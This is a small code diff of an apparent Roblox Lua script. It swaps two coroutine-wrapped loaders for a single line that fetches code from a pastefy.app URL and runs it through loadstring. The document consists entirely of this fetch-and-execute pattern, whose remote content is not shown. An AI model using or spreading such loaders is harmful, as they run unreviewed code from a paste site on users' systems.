@@ -1,10 +1,2 @@
-local script1 = coroutine.create(function()
-    loadstring(game:HttpGet("https://pastefy.app/VQwXim3w/raw"))()
-end)
+loadstring(game:HttpGet("https://pastefy.app/VQwXim3w/raw"))()
 
-local script2 = coroutine.create(function()
-    loadstring(game:HttpGet("https://pastefy.app/dfb9apMV/raw"))()
-end)
-
-coroutine.resume(script1)
-coroutine.resume(script2)
